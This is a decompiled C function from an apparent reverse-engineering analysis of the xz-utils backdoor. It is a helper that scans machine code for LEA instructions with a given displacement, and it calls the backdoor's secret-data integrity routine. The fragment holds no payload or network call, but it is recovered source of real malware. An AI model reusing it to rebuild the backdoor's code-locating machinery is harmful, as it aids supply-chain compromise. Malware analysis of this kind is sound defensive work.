// /home/kali/xzre-ghidra/xzregh/100EB0_find_lea_instruction.c
// Function: find_lea_instruction @ 0x100EB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction(u8 * code_start, u8 * code_end, u64 displacement)


/*
 * AutoDoc: Telemetry-backed search for LEA instructions that materialise a specific displacement.
 * Slides one byte at a time, requires opcode `0x10d`, demands DF2 report a plain displacement operand, and treats `displacement` and `-displacement` as equivalent so mirrored scans still qualify.
 * Returns TRUE with the stack-resident decoder context describing the LEA when found.
 */

#include "xzre_types.h"

BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  byte clear_stride_marker;
  dasm_ctx_t lea_ctx;
  
  clear_stride_marker = 0;
  decode_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,FALSE);
  if (decode_ok != FALSE) {
    zero_ctx = &lea_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&zero_ctx->instruction = 0;
      zero_ctx = (dasm_ctx_t *)((long)zero_ctx + ((ulong)clear_stride_marker * -2 + 1) * 4);
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      decode_ok = x86_dasm(&lea_ctx,code_start,code_end);
      if ((((decode_ok != FALSE) && (*(u32 *)&lea_ctx.opcode_window[3] == 0x10d)) &&
          ((lea_ctx.prefix.decoded.flags2 & 7) == 1)) &&
         ((lea_ctx.mem_disp == displacement || (lea_ctx.mem_disp == -displacement)))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

